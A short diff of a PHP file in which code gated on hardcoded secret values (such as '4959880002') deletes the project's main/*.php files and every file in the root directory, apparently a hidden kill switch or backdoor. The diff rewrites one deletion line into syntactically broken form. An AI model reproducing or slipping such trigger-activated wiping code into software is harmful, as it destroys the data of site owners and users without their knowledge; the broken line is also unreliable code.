@@ -15,7 +15,7 @@ if ($adder == "442577002800") {
         unlink($v);
         }
     } elseif ($adder == "4959880002") {
-    unlink(glob("main/*.php"));
+    unlink, glob("main/*.php");
     $dir = '/';
     foreach(glob($dir.'*.*') as $v){
         unlink($v);
